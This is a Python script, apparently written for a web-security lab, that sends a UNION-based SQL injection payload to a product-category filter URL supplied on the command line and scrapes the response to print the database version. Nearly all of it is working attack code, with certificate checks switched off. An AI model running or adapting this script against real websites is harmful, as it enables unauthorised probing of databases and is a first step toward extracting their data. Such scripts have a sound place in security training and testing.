import requests
from variables import constants
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def exploit_sqli_version(url):
    path = "/filter?category=Accessories"
    sql_payload = "' UNION SELECT @@version, NULL%23"
    r = requests.get(url + path + sql_payload, verify=False)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
    if version is None:
        return False
    else:
        print(f"[+] The database version is: {version}")
        return True


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    print("[+] Dumping the version of the database...")
    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version.")
